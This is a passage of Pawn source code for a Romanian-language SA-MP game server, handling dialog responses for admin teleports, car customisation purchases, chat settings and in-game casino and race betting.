			        ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'Colonel Fuhrberger s'.", GetName(playerid));
			    }
			    case 5: {
			        SetPlayerVirtualWorld(playerid, 0);
			        SetPlayerInterior(playerid, 5);
			        SetPlayerPos(playerid, 318.564971, 1118.209960, 1083.882812);
			        ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'Crack Den'.", GetName(playerid));
			    }
			    case 6: {
			        SetPlayerVirtualWorld(playerid, 0);
			        SetPlayerInterior(playerid, 1);
			        SetPlayerPos(playerid, 244.411987, 305.032989, 999.148437);
			        ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'Denise s Room'.", GetName(playerid));
			    }
			    case 7: {
			        SetPlayerVirtualWorld(playerid, 0);
			        SetPlayerInterior(playerid, 2);
			        SetPlayerPos(playerid, 271.884979, 306.631988, 999.148437);
			        ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'Katie s Room'.", GetName(playerid));
			    }
			    case 8:
			    {
			        SetPlayerVirtualWorld(playerid, 0);
			        SetPlayerInterior(playerid, 6);
			        SetPlayerPos(playerid, 234.5533,1066.3735,1084.2084);
			        ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'Big Interior'.", GetName(playerid));
			    }
			    case 9:
			    {
			        SetPlayerVirtualWorld(playerid, 0);
			        SetPlayerInterior(playerid, 12);
			        SetPlayerPos(playerid, 2324.5300,-1141.6395,1050.9835);
			        ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'Big Safe House'.", GetName(playerid));
			    }			        
			}
    	}
    	case DIALOG_GO2: {
    		if(response) switch(listitem) {
    			case 0: {
    				SetPlayerVirtualWorld(playerid, 0);
			        SetPlayerInterior(playerid, 4);
			        SetPlayerPos(playerid, -1444.645507, -664.526000, 1053.572998);
    				ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'Dirt Track'.", GetName(playerid));
    			}
    			case 1: {
			        SetPlayerVirtualWorld(playerid, 0);
			        SetPlayerInterior(playerid, 1);
			        SetPlayerPos(playerid, -1401.829956, 107.051300, 1032.273437);
			        ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'Vice Stadium'.", GetName(playerid));
			    }
			    case 2: {
			        SetPlayerVirtualWorld(playerid, 0);
			        SetPlayerInterior(playerid, 15);
			        SetPlayerPos(playerid, -1398.103515, 937.631164, 1036.479125);
			        ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'Bloodbowl Stadium'.", GetName(playerid));
			    }
			    case 3: {
			        SetPlayerVirtualWorld(playerid, 0);
			        SetPlayerInterior(playerid, 7);
			        SetPlayerPos(playerid, -1398.065307, -217.028900, 1051.115844);
			        ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to '8-Track Stadium'.", GetName(playerid));
			    }
			    case 4: {
			        SetPlayerVirtualWorld(playerid, 0);
			        SetPlayerInterior(playerid, 14);
			        SetPlayerPos(playerid, -1465.268676, 1557.868286, 1052.531250);
			        ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'Kickstart Stadium'.", GetName(playerid));
			    }
    		}
    	}
    	case DIALOG_GO3: {
    		if(response) switch(listitem) {
    			case 0: {
    				SetPlayerVirtualWorld(playerid, 0);
			        SetPlayerInterior(playerid, 0);
			        SetPlayerPos(playerid, 1550.2311, -1675.4509, 15.3155);
    				ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'Los Santos'.", GetName(playerid));
    			}
    			case 1: {
			        SetPlayerVirtualWorld(playerid, 0);
			        SetPlayerInterior(playerid, 0);
			        SetPlayerPos(playerid, -1641.9742, 431.1623, 7.1102);
			        ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'San Fierro'.", GetName(playerid));
			    }
			    case 2: {
			        SetPlayerVirtualWorld(playerid, 0);
			        SetPlayerInterior(playerid, 0);
			        SetPlayerPos(playerid, 1699.2, 1435.1, 10.7);
			        ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'Las Venturas'.", GetName(playerid));
			    }
    		}
    	}
    	case DIALOG_GO4: {
    		if(response) switch(listitem) {
    			case 0: {
			        SetPlayerVirtualWorld(playerid, 0);
			        SetPlayerInterior(playerid, 0);
			        SetPlayerPos(playerid, 595.5443,-1250.3405,18.2836);
			        ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'Bank (exterior)'.", GetName(playerid));
			    }
			    case 1: {
			        SetPlayerVirtualWorld(playerid, 0);
			        SetPlayerInterior(playerid, 0);
			        SetPlayerPos(playerid, 2222.6714, -1724.8436, 13.5625);
			        ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'Gym (exterior)'.", GetName(playerid));
			    }
			    case 2: {
			        SetPlayerVirtualWorld(playerid, 0);
			        SetPlayerInterior(playerid, 0);
			        SetPlayerPos(playerid, 1172.359985, -1323.313110, 15.402919);
			        ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'All Saints Hospital'.", GetName(playerid));
			    }
			    case 3: {
			        SetPlayerVirtualWorld(playerid, 0);
			        SetPlayerInterior(playerid, 0);
			        SetPlayerPos(playerid, 2034.196166, -1402.591430, 17.295030);
			        ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'County General Hospital'.", GetName(playerid));
			    }
			    case 4: {
			        SetPlayerVirtualWorld(playerid, 0);
			        SetPlayerInterior(playerid, 0);
			        SetPlayerPos(playerid, 1545.0101,-1676.0103,13.5595);
			        ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'Newbie Spawn'.", GetName(playerid));
			    }
    		}
    	}
    	case DIALOG_GO5: {
    		if(response) switch(listitem) {
    			case 0: {
		            SetPlayerVirtualWorld(playerid, 0);
		            SetPlayerInterior(playerid, 5);
		            SetPlayerPos(playerid, 772.111999, -3.898649, 1000.728820);
		            ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'Ganton Gym (LS)'.", GetName(playerid));
		        }
		        case 1: {
           			SetPlayerVirtualWorld(playerid, 0);
		            SetPlayerInterior(playerid, 6);
		            SetPlayerPos(playerid, 774.213989, -48.924297, 1000.585937);
		            ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'Cobra Martial Arts (SF)'.", GetName(playerid));
		        }
		        case 2: {
		            SetPlayerVirtualWorld(playerid, 0);
		            SetPlayerInterior(playerid, 7);
		            SetPlayerPos(playerid, 773.579956, -77.096694, 1000.655029);
		            ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'Below the Belt Gym (LV)'.", GetName(playerid));
		        }
    		}
    	}
    	case DIALOG_GO6: {
    		if(response) switch(listitem) {
    			case 0: {
				   	SetPlayerVirtualWorld(playerid, 0);
				    SetPlayerInterior(playerid, 10);
				    SetPlayerPos(playerid, -975.975708, 1060.983032, 1345.671875);
				    ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'RC Battlefield'.", GetName(playerid));
				}
				case 1: {
				   	SetPlayerVirtualWorld(playerid, 0);
				    SetPlayerInterior(playerid, 0);
					SetPlayerPos(playerid, 223.431976, 1872.400268, 13.734375);
					ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'Area 69'.", GetName(playerid));
				}
				case 2: {
					SetPlayerVirtualWorld(playerid, 0);
				    SetPlayerInterior(playerid, 1);
				    SetPlayerPos(playerid, 1412.639892, -1.787510, 1000.924377);
				    ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'Warehouse 1'.", GetName(playerid));
			    	}
				case 3: {
					SetPlayerVirtualWorld(playerid, 0);
				    SetPlayerInterior(playerid, 18);
				    SetPlayerPos(playerid, 1302.519897, -1.787510, 1001.028259);
				    ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'Warehouse 2'.", GetName(playerid));
				}
				case 4: {
					SetPlayerVirtualWorld(playerid, 0);
				    SetPlayerInterior(playerid, 1);
				    SetPlayerPos(playerid, 963.418762, 2108.292480, 1011.030273);
				    ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'Meat Factory'.", GetName(playerid));
				}
				case 5: {
					SetPlayerVirtualWorld(playerid, 0);
				    SetPlayerInterior(playerid, 17);
				    SetPlayerPos(playerid, -959.564392, 1848.576782, 9.000000);
				    ABroadcast(COLOR_LIGHTRED, 1, "(/go): {FFFFFF}Admin %s teleported to 'Sherman Dam'.", GetName(playerid));
				}
    		}
    	}
    	case DIALOG_PHONECREDITS: {
    		new suma_credite = strval(inputtext) * 100;
    		if(GetPlayerCash(playerid) < suma_credite) return SendClientMessage(playerid, COLOR_GREY, "Nu ai destui bani pentru a face asta.");
    		GivePlayerCash(playerid, -suma_credite);
			BizzInfo[InInteriorID[playerid]][bBalance] += suma_credite;
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			PlayerInfo[playerid][pCredit] += strval(inputtext);
    		SCMf(playerid, -1, "Ai achizitionat %d credite pentru telefon si ai platit $%s.", strval(inputtext), FormatNumber(suma_credite));
    		UpdateVar(playerid, "Credit", PlayerInfo[playerid][pCredit]);
			RegisrationStep[playerid][2] = false;
			if(PlayerInfo[playerid][pTutorial] == 2 && HavePhone(playerid) && PlayerInfo[playerid][pPhoneBook] && PlayerInfo[playerid][pCredit]) {
				for(new i=0;i<20;i++) SendClientMessage(playerid, COLOR_LIGHTGOLD, "");
				SendClientMessage(playerid, COLOR_LIGHTGOLD, " -- Tutorial Step 3/5 -- ");
				SendClientMessage(playerid, COLOR_LIGHTGOLD, "Ti-ai cumparat toate lucrurile necesare pentru contul tau.");
				SendClientMessage(playerid, COLOR_LIGHTGOLD, "Urmatorul pas pe care trebuie sa-l faci este de a-ti schimba skinul.");
				SendClientMessage(playerid, COLOR_LIGHTGOLD, "Pentru a localiza un biz de tip Binco, foloseste comanda (/gps).");
				SendClientMessage(playerid, COLOR_LIGHTGOLD, " -- ");
				GameTextForPlayer(playerid, "Step: 3/5", 5000, 1);
				PlayerInfo[playerid][pTutorial]++;
				UpdateVar(playerid, "Tutorial", PlayerInfo[playerid][pTutorial]);
				SetPlayerCheckpoint(playerid, 2101.8936,2257.4214,11.0234, 2.0);
				CP[playerid] = 53;
			}
    	}
    	case DIALOG_SHOP_CNUMBER: {
    		if(strlen(inputtext) < 3 || strlen(inputtext) > 11) return SendErrorMsg(playerid, "Limita de caractere este intre 3-11!");
    		if(IsNumeric(inputtext)) return SendErrorMsg(playerid, "Poti pune un numar custom format doar din litere.");

    		mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `PhoneNr`='%e' LIMIT 1", inputtext);
			return mysql_tquery(SQL, gQuery, "sql_new_phone2", "is", playerid, inputtext);
    	}
    	case DIALOG_BLOCKCMD: {
    		if(!response) return true;
			if !PC_CommandExists(inputtext) *then
				return SendClientMessage(playerid, COLOR_GREY, "Aceasta comanda nu exista!");
			mysql_format(SQL, gQuery, sizeof gQuery,"SELECT * FROM `commands` WHERE `name` = '%s' LIMIT 1", inputtext);
			mysql_tquery(SQL, gQuery, #cache_block_command, #is, playerid, inputtext);
    	}
    	case DIALOG_NEONTICKETS: {
    		if(!response) return true;

    		new idd = FindSpawnID(GetPlayerVehicleID(playerid));
    		if(idd == -1) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti in unul dintre vehiculele tale personale!");

    		if(!PlayerInfo[playerid][pNeonTickets][listitem])
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai un neon de acel tip!");

    		listitemm[playerid] = listitem;
    		ShowPlayerDialog(playerid, DIALOG_NEONTICKETS_C, DIALOG_STYLE_MSGBOX, "Use Neon Ticket", "Esti sigur ca doresti sa folosesti acest neon ticket?", "Da", "Nu");
    	}
    	case DIALOG_NEONTICKETS_C: {
			if(!response)
    			return true;

    		if(!IsPlayerInAnyVehicle(playerid))
    			return true;

    		new idd = FindSpawnID(GetPlayerVehicleID(playerid));
    		if(idd == -1)
    			return true;
    		SCMf(playerid, -1, "Neons have been attached to your vehicle. (ticket) [carid: #%d]", CarInfo[idd][cID]);

    		if(CarInfo[idd][cNeon] != 0) {
    			DestroyDynamicObject(CarInfo[idd][cNeonObj][0]); CarInfo[idd][cNeonObj][0] = INVALID_OBJECT_ID;
    			DestroyDynamicObject(CarInfo[idd][cNeonObj][1]); CarInfo[idd][cNeonObj][1] = INVALID_OBJECT_ID;
    		}

    		CarInfo[idd][cNeon] = listitemm[playerid]+1;
	    	new const neonObj[6] = {18652, 18651, 18650, 18649, 18648, 18647};
	    	CarInfo[idd][cNeonObj_][0] = CarInfo[idd][cNeonObj_][1] = neonObj[listitemm[playerid]];

    		UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
    		_query("UPDATE `cars` SET `Neon`='%d', `NeonObj` = '%i %i' WHERE `ID`='%d'", listitemm[playerid]+1, CarInfo[idd][cNeonObj_][0], CarInfo[idd][cNeonObj_][1], CarInfo[idd][cID]);
    		AttachNeon(idd);
    		PlayerInfo[playerid][pNeonTickets][listitemm[playerid]]--;
    		save_neon_tickets(playerid);
    	}
    	case DIALOG_CARPLATECOLOR: {
    		if(!response) return true;
    		listitemm[playerid] = listitem;
    		new idd = PersonalCar(playerid);
    		format(gString, sizeof gString, "{FFFFFF}Esti sigur ca vrei sa iti pui aceasta culoare \"{%s}%s{FFFFFF}\"?\nVei plati {0e8b02}100 puncte premium{FFFFFF} pentru aceasta modificare.", carplateColors(listitem), CarInfo[idd][cLicense]);
    		ShowPlayerDialog(playerid, DIALOG_CARPLATECOLOR_CONFIRM, DIALOG_STYLE_MSGBOX, "{f4ad42}Car {FFFFFF}Plate Color", gString, "Da", "Nu");
    	}
    	case DIALOG_CARPLATECOLOR_CONFIRM: {
    		new idd = PersonalCar(playerid);
    		format(CarInfo[idd][cLicenseColor], 100, "%s", carplateColors(listitemm[playerid]));
    		format(gString, sizeof gString, "{%s}%s", CarInfo[idd][cLicenseColor], CarInfo[idd][cLicense]);
    		//format(CarInfo[idd][cLicense], 100, "{%s}%s", carplateColors(listitemm[playerid]), CarInfo[idd][cLicense]);
    		SetVehicleNumberPlate(CarInfo[idd][Spawned], gString);
    		new sal = GetPlayerVehicleID(playerid);
    		DestroyPlayerCar(idd);	
    		SpawnPlayerCar(playerid, idd);
    		new Float:Pos[4];
    		GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
    		GetPlayerFacingAngle(playerid, Pos[3]);
			SetVehiclePos(sal, Pos[0], Pos[1], Pos[2]);
			SetVehicleZAngle(sal, Pos[3]);
			PutPlayerInVehicle(playerid, sal, 0);
    		SCMf(playerid, -1, "Felicitari! Ti-ai pus {%s}aceasta {FFFFFF}culoare la carplate-ul tau {FFFFFF}\"{0e8b02}%s{FFFFFF}\".", CarInfo[idd][cLicenseColor], CarInfo[idd][cLicense]);
    		mysql_format(SQL, string, sizeof(string), "UPDATE cars SET LicenseColor='%s' WHERE ID=%d", carplateColors(listitemm[playerid]), CarInfo[idd][cID]);
			mysql_tquery(SQL, string, "", "");
			PlayerInfo[playerid][pPremiumPoints] -= 100;
    	}
    	case DIALOG_CARPLATE: {
    		if(!response) return true;
    		new pretul_carplate[MAX_PLAYERS];
    		pretul_carplate[playerid] = checkPrice(p_carPlate[playerid])*10000000;
    		if(GetPlayerCash(playerid) < pretul_carplate[playerid])
    			return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai aceasta suma de banii!");

    		GivePlayerCash(playerid, -pretul_carplate[playerid]);
    		SCMf(playerid, COLOR_YELLOW, "Ai platit $%d0.000.000 pentru actualizarea numarului de inmatriculare. (%s)", checkPrice(p_carPlate[playerid]), p_carPlate[playerid]);
    		SendClientMessage(playerid, -1, "Numarul de inmatriculare a fost salvat. Acesta se va pune automat la urmatorul respawn al vehiculului.");
    		new idd = PersonalCar(playerid);
    		SetVehicleNumberPlate(CarInfo[idd][Spawned], p_carPlate[playerid]);
    		format(CarInfo[idd][cLicense], 100, "%s", p_carPlate[playerid]);
    		mysql_format(SQL, string, sizeof(string), "UPDATE cars SET License='%s', Customlicense='1' WHERE ID=%d", p_carPlate[playerid], CarInfo[idd][cID]);
			mysql_tquery(SQL, string, "", "");
			CarInfo[idd][cCustomLicense] = true;
    		new sal = GetPlayerVehicleID(playerid);
    		DestroyPlayerCar(idd);	
    		SpawnPlayerCar(playerid, idd);
    		new Float:Pos[4];
    		GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
    		GetPlayerFacingAngle(playerid, Pos[3]);
			SetVehiclePos(sal, Pos[0], Pos[1], Pos[2]);
			SetVehicleZAngle(sal, Pos[3]);
			PutPlayerInVehicle(playerid, sal, 0);
    	}
    	case COLOR_LEGENDCOLOR: {
    		if(!response) return true;

    		if(strlen(inputtext)!=6||sscanf(inputtext, "{x}"))
    			return SendClientMessage(playerid, COLOR_GREY, "Invalid hex color!");

    		strmid(PlayerInfo[playerid][pChatColor], inputtext, 0, 7);
    		SCMf(playerid, -1, "Culoare modificata! Numele tau va arata asa: {%s}%s", inputtext, GetName(playerid));
    		PlayerInfo[playerid][pColor] = 69;

    		_query("UPDATE `users` SET `ChatColor` = '%s', `Color` = '%i' WHERE `id` = %i", PlayerInfo[playerid][pChatColor], PlayerInfo[playerid][pColor], PlayerInfo[playerid][pSQLID]);
    	}
    	case DIALOG_ACOLOR: {
    		if(!response) return true;
			switch(listitem) {
				default: PlayerInfo[playerid][pColor] = listitem + 25;
			}
			UpdateVar(playerid, "Color", PlayerInfo[playerid][pColor]);
			SCMf(playerid, COLOR_WHITE,"{%s}Server:{FFFFFF} Nick color changed! Hope you like the new color!", PlayerInfo[playerid][pColor]);
    	}
    	case DIALOG_BUYCREDIT: {
    		if(!response) return true;
    		if(!IsNumeric(inputtext)) return true;
			if(!int.Range(strval(inputtext))<0, 5001>) return SendErrorMsg(playerid, "Invalid amount!");
    		if(GetPlayerCash(playerid) < strval(inputtext) * 100000) return SendErrorMsg(playerid, "Nu ai aceasta suma de banii!");

            PlayerInfo[playerid][pCasinoCredit] += strval(inputtext);
    		va_SendClientMessage(playerid, COLOR_MONEY, "Ai cumparat %d credite si ai platit $%s!", strval(inputtext), FormatNumber(strval(inputtext)*100000));
    		GivePlayerCash(playerid, -strval(inputtext) * 100000);
    	}
    	case DIALOG_SELLCREDIT: {
    		if(!response) return true;
    		if(!int.Range(strval(inputtext))<0, 5001>) return SendErrorMsg(playerid, "Invalid amount!");
    		if(PlayerInfo[playerid][pCasinoCredit] < strval(inputtext)) return SendErrorMsg(playerid, " Nu ai aceasta suma de credite!");

    		PlayerInfo[playerid][pCasinoCredit] -= strval(inputtext);
    		va_SendClientMessage(playerid, COLOR_MONEY, "Ai vandut %d credite si ai primit $%s!", strval(inputtext), FormatNumber(strval(inputtext) * 95000));
			GivePlayerCash(playerid, strval(inputtext) * 95000);
    	}
    	case DIALOG_BETMACHINE: {
    		if(!response) return true;
    		if(!IsNumeric(inputtext) || (strval(inputtext) < 10 || strval(inputtext) > (PlayerInfo[playerid][pVip]!=3?50:100))) return SendErrorMsg(playerid, "Invalid amount!");
    		if(PlayerInfo[playerid][pCasinoCredit] < strval(inputtext)) return SendErrorMsg(playerid, "Nu ai suficient credit!");

    		machine_Bet[playerid] = strval(inputtext);
    		va_PlayerTextDrawSetString(playerid, machine_TD[playerid][21], "BET~N~%d CREDITS", strval(inputtext));
    	}
    	case DIALOG_CHATCMD: {
    		if !response *then
    			return true;

    		switch listitem do {
    			case 1: if !PlayerInfo[playerid][pWTalkie] *then return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai frecventa!");
    			case 3: if !PlayerInfo[playerid][pClan] *then return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu faci parte dintr-un clan!");
    			case 4: if !PlayerInfo[playerid][pMember] *then return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu faci parte dintr-o factiune!");
    			case 5: if !PlayerInfo[playerid][pPremiumAccount] *then return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Contul tau nu este unul de tip Premium!");
    			case 6: if !PlayerInfo[playerid][pVip] *then return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Contul tau nu este unul de tip VIP!");
    			case 7: if !PlayerInfo[playerid][pReborn] *then return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Contul tau nu este unul de tip Reborn!");
    			case 8: if !(PlayerInfo[playerid][pVip]==3) *then return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Contul tau nu este unul de tip Legend!");
    		}
			static const _x[][] = {"Disable Chat CMD","Frequency","Car Whisper","Clan Chat","Faction Chat","Premium Chat","VIP Chat", "Reborn Chat", "Legend Chat"};
	    	if listitem *then {
	    		format(gString, 80, "chat cmd: ~b~~h~%s", _x[listitem]);
	    		PlayerTextDrawSetString(playerid, ChatCMD, gString);
	    		PlayerTextDrawShow(playerid, ChatCMD);
    		} else PlayerTextDrawHide(playerid, ChatCMD);
    		PlayerInfo[playerid][pChatCMD] = listitem;
    		SCMf(playerid, COLOR_LGREEN, "[Chat CMD] Option selected: %s.", _x[listitem]);
    	}
    	case DIALOG_STATSINFO: {
    		if !response *then 
    			return true;

    		PlayerInfo[playerid][pStatsInfo][listitem]=!PlayerInfo[playerid][pStatsInfo][listitem];
    		format(gString, 160, "1. Account - %s\n2. Faction - %s\n3. Clan - %s\n4. General - %s\n5. Properties - %s", !PlayerInfo[playerid][pStatsInfo][0]?("{0AC917}Enabled"):("{FF0000}Disable"), !PlayerInfo[playerid][pStatsInfo][1]?("{0AC917}Enabled"):("{FF0000}Disable"), !PlayerInfo[playerid][pStatsInfo][2]?("{0AC917}Enabled"):("{FF0000}Disable"), !PlayerInfo[playerid][pStatsInfo][3]?("{0AC917}Enabled"):("{FF0000}Disable"), !PlayerInfo[playerid][pStatsInfo][4]?("{0AC917}Enabled"):("{FF0000}Disable"));
			ShowPlayerDialog(playerid, DIALOG_STATSINFO, DIALOG_STYLE_LIST, "{F4AD42}Stats {FFFFFF}Menu", gString, "Ok", "Close");
    		_query("UPDATE `users` SET `stats_info` = '%i %i %i %i %i' WHERE `id` = '%i'", PlayerInfo[playerid][pStatsInfo][0], PlayerInfo[playerid][pStatsInfo][1], PlayerInfo[playerid][pStatsInfo][2], PlayerInfo[playerid][pStatsInfo][3], PlayerInfo[playerid][pStatsInfo][4], PlayerInfo[playerid][pSQLID]);
    		SendClientMessage(playerid, 0xFFADADFF, "Updated changes!");
    	}
    	case DIALOG_BLACK: return response?PutRouletteBet(playerid, strval(inputtext), 0):1;
    	case DIALOG_RED: return response?PutRouletteBet(playerid, strval(inputtext), 1):1;
    	case DIALOG_GREEN: return response?PutRouletteBet(playerid, strval(inputtext), 2):1;
    	case DIALOG_BET_BL: {
    		if !response *then
    			return true;

    		new i=-1,pos=bl_slot_id[playerid][1], val = strval(inputtext);

    		if bl_count[pos]>=6 *then
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Aceasta masa e deja plina!");

			if bl_status[pos]!=BL_WAITING *then
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Este deja o runda inceputa la aceasta masa de blackjack!");

    		if(val<=0) 
    			return SendClientMessage(playerid, -1, "Error: You can't bet this amount.");

    		if(val<_jack_bet_[pos/2][0]||val>_jack_bet_[pos/2][1])
    			return SendClientMessage(playerid, -1, "Error: You can't bet this amount.");

    		if GetPlayerCash(playerid) < val *then
    			return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai aceasta suma de banii.");

    		while((++i)<7) {
				if bl_slot[pos][i]!=-1 *then continue;

				bl_slot_id[playerid][0] = i;
				break;
			}

    		bl_bet[pos][i] = val;
    		blackjack_show(playerid, pos, i);
    	}
    	case DIALOG_RAINBOW: {
    		if !response *then
    			return true;

    		new idd = listitemm[playerid];

    		if listitem *then {
    			if !CarInfo[idd][cRainbows][listitem-1] *then {
    				listitem--; listitemmm[playerid] = listitem;
    				format(gString, 256, "Doresti sa upgradezi vehiculul tau la 'Rainbow %s'?\nAceata optiune costa %d puncte premium.",
    					r_Colors[listitem], 250 - (listitem*50));
    				ShowPlayerDialog(playerid, DIALOG_BUYRAINBOW, DIALOG_STYLE_MSGBOX, "{F4AD42}Rainbow {FFFFFF}Menu", gString, "Da", "Nu");
    				return true;
    			}
    		}
    		SCMf(playerid, 0xFFADADFF, "Updated changes! (type selected: #%d)!", listitem+1);
    		K[playerid] =0;
    		CarInfo[idd][cRainBow] = listitem+1;
    		_query("UPDATE `cars` SET `RainBow` = '%i' WHERE `ID` = '%i'", CarInfo[idd][cRainBow], CarInfo[idd][cID]);
    	}
    	case DIALOG_BUYRAINBOW: {
    		if !response *then
    			return true;

    		new _x=listitemmm[playerid],idd=listitemm[playerid];

    		if(PlayerInfo[playerid][pPremiumPoints] < 250 - (_x*50))
    			return ShowPlayerDialog(playerid, DIALOG_INVALID, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
    		
    		PlayerInfo[playerid][pPremiumPoints] -= 250 - (_x*50);
    		CarInfo[idd][cRainbows][_x] = true;
    		_query("UPDATE `cars` SET `Rainbows` = '%i|%i|%i|%i' WHERE `ID` = '%i'", CarInfo[idd][cRainbows][0], CarInfo[idd][cRainbows][1], CarInfo[idd][cRainbows][2], CarInfo[idd][cRainbows][3], CarInfo[idd][cID]);
    		
    		UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
    		SCMf(playerid, COLOR_LGREEN, "Vehicle successfully updated to 'Rainbow %s'. (-%d premium points)", r_Colors[_x], 250 - (_x*50));
    	}
    	case DIALOG_BETRACE: {
    		if !response *then
    			return true;

    		new amount=strval(inputtext);
    		if amount<50000||amount>5000000 *then
    			return SendClientMessage(playerid, COLOR_LGREEN, "Invalid amount.");


    		place_bet[playerid]=true;
    		race_bet += amount;
    		GivePlayerCash(playerid, -amount);
    		sendRaceMessage(COLOR_CLIENT, "[BET] %s bet $%s for this race.", GetName(playerid), FormatNumber(amount));
    	}
    	case DIALOG_VOTECOLLESION: {
    		if(raceVoted[playerid][1] && response || !raceVoted[playerid][1] && !response) return true;
    		sendRaceMessage(COLOR_CLIENT, "[VOTE] %s voted for collision %s.", GetName(playerid), response?("off"):("on"));
			raceVoted[playerid][1] = response;
    	}
    	case DIALOG_UPGRADESHARD: {
    		if(!response)
    			return true;

    		if(PlayerInfo[playerid][pPremiumPoints] < 100)
    			return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai suficiente puncte premium!");

    		PlayerInfo[playerid][pPremiumPoints] -= 100;
    		PlayerInfo[playerid][pShard][listitemmm[playerid]] -= 4;
    		save_shards(playerid); UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);

    		if(random(100) <= 80) {
	    		switch(listitemmm[playerid]) {
	    			case 0: {
	    				GiveVehicle(playerid, 444);
	    				SendClientMessage(playerid, COLOR_WHITE, "{2EAF21}(Sharden) {FFFFFF}Felicitari! Ai upgradat cu succes si ai primit un vehicul de tip 'Monster'.");
	    			}
	    			case 1: {
	    				GiveVehicle(playerid, 531);
	    				SendClientMessage(playerid, COLOR_WHITE, "{2EAF21}(Sharden) {FFFFFF}Felicitari! Ai upgradat cu succes si ai primit un vehicul de tip 'Tractor'.");
	    			}
	    			case 2: {
	    				GiveVehicle(playerid, 444, true);
	    				SendClientMessage(playerid, COLOR_WHITE, "{2EAF21}(Sharden) {FFFFFF}Felicitari! Ai upgradat cu succes si ai primit un vehicul de tip 'Monster [P]'.");
	    			}
	    		}
	    	} else SendClientMessage(playerid, COLOR_WHITE, "{2EAF21}(Sharden) {FFFFFF}Upgrade esuat! Ai pierdut toate cele 4 fragmente.");
    	}
    	case DIALOG_HATS: {
    		if(!response)
    			return true;

    		if(!PlayerInfo[playerid][pHats][listitem]) 
    			return true;

    		switch(listitem) {
    			case 0: {
    				if(PlayerInfo[playerid][pShowHat]) return SendClientMessage(playerid, -1, "Ai deja palarie pe cap, foloseste (/removehat) pentru a scoate palaria.");
    				if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
    				else SetPlayerAttachedObject(playerid, 1, 19066, 2, 0.1639, 0.0300, -0.0029, -96.0000, 86.9000, -176.3997, 1.2400, 1.0930, 1.0390);
    				SendClientMessage(playerid, COLOR_WHITE, "Ti-ai pus palaria special de craciun.");
    			}
    			case 1: {
    				if(PlayerInfo[playerid][pShowHat]) return SendClientMessage(playerid, -1, "Ai deja palarie pe cap, foloseste (/removehat) pentru a scoate palaria.");
    				SendClientMessage(playerid, COLOR_WHITE, "Ti-ai pus palaria special de halloween.");
    				if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
    				else SetPlayerAttachedObject(playerid, 1, 19528, 2, 0.1549, 0.0049, 0.0000, 0.0000, 0.0000, 0.0000, 1.0000, 1.0000, 1.0000);
    			}
    			case 2..8: {
    				new const mask_obj[] = {18919, 18914, 18915, 18916, 18917, 18918, 18920};
